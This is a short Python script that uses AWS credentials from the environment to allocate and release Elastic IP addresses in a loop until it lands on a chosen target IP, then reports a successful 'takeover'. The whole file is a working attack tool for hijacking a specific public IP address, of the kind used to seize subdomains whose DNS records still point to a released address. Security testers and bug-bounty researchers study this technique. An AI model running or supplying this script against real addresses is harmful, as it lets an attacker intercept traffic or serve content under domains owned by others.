import time
import os
import boto3

found = False
aws_region      = "ap-southeast-1"
target_ec2      = ['1.1.1.1']  ## put target IP here

ec2 = boto3.client(
    'ec2',
    aws_access_key_id=os.getenv("AWS_ACCESS_KEY_ID"),
    aws_secret_access_key=os.getenv("AWS_SECRET_ACCESS_KEY"),
    region_name=aws_region
)

print("[i] Start")
while not found:
    allocation      = ec2.allocate_address(Domain='vpc')
    address         = allocation["PublicIp"]
    allocation_id   = allocation["AllocationId"]
    if address in target_ec2:
        found = True
        print("[i] EC2 Successfully Takeover : {0}".format(address))
    else:
        print("[!] EC2 Failed to Takeover : {0}".format(address))
        ec2.release_address(AllocationId=allocation_id)
        print("[!] Wait for 60 seconds")
        time.sleep(60)
        print("[i] Retry")